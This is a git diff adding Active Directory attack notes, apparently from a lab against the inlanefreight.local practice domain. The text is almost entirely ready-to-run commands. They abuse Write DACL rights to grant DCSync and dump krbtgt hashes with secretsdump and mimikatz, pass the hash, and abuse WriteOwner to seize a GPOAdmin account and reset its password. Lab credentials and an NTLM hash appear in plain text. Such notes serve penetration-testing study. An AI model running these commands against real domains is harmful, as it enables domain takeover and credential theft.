@@ -160,3 +160,57 @@ mimikatz(commandline) # privilege::debug
 
 mimikatz(commandline) # sekurlsa::pth /user:apache-dev$ /domain:inlanefreight.local /ntlm:69978088B44350772FEBDB1E3DAC6F39 /run:powershell.exe
 ```
+
+## Write DACL
+### Enumeration
+```powershell
+Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
+
+Import-Module .\PowerView.ps1
+
+$userSID = ConvertTo-SID luna
+
+Get-DomainSID | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}
+```
+```bash
+python3 examples/dacledit.py -principal luna -target-dn dc=inlanefreight,dc=local -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123
+```
+
+### Abusing
+```bash
+python3 examples/dacledit.py -principal luna -target-dn dc=inlanefreight,dc=local -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123 -action write -rights DCSync
+
+secretsdump.py -just-dc-user krbtgt inlanefreight.local/luna:Moon123@10.129.205.81
+```
+```powershell
+Import-Module .\PowerView.ps1
+
+Add-DomainObjectAcl -TargetIdentity $(Get-DomainSID) -PrincipalIdentity luna -Rights DCSync -Verbose
+```
+```
+mimikatz.exe "lsadump::dcsync /domain:inlanefreight.local /user:krbtgt /csv"
+
+mimikatz(commandline) # lsadump::dcsync /domain:inlanefreight.local /user:krbtgt /csv
+```
+```bash
+python3 addusertogroup.py -d inlanefreight.local -g "Finance" -a luna -u luna -p Moon123
+```
+
+## WriteOwner
+- bloodhound로 확인
+
+### Abusing
+```bash
+python3 examples/owneredit.py -action write -new-owner pedro -target GPOAdmin -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
+
+python3 examples/dacledit.py -principal pedro -target GPOAdmin -action write -rights FullControl -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
+
+net rpc password GPOAdmin Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
+```
+```powershell
+import-module .\powerview.ps1
+
+Set-DomainObjectOwner -Identity GPOAdmin -OwnerIdentity pedro -Verbose
+
+Add-DomainObjectAcl -TargetIdentity GPOAdmin -PrincipalIdentity pedro -Rights All -Verbose
+```
